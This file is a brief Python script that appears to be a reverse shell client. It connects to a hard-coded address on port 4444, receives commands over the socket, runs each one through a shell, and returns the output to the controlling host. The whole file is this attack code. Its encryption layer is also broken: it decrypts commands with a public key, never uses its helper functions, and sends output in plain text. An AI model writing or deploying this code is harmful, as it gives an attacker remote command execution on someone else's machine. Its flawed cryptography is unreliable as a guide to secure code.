import socket
import subprocess
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

ip = "192.168.1.7"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Receive the public key from the server
public_key_pem = s.recv(2048).decode()
print("[*] Received public key: {}".format(public_key_pem))
public_key = RSA.import_key(public_key_pem)

# Encrypt data using RSA
def rsa_encrypt(data, public_key):
    cipher = PKCS1_OAEP.new(public_key)
    return cipher.encrypt(data.encode())

# Decrypt data using RSA
def rsa_decrypt(data, private_key):
    cipher = PKCS1_OAEP.new(private_key)
    return cipher.decrypt(data).decode()

while True:
    # Receive and decrypt command from the server
    encrypted_command = s.recv(256)
    cipher = PKCS1_OAEP.new(public_key)
    command = cipher.decrypt(encrypted_command).decode()
    print("[*] Received command: {}".format(command))

    if command.lower() == "exit":
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        s.sendall(output)
    except Exception as e:
        s.sendall(str(e).encode())

s.close()
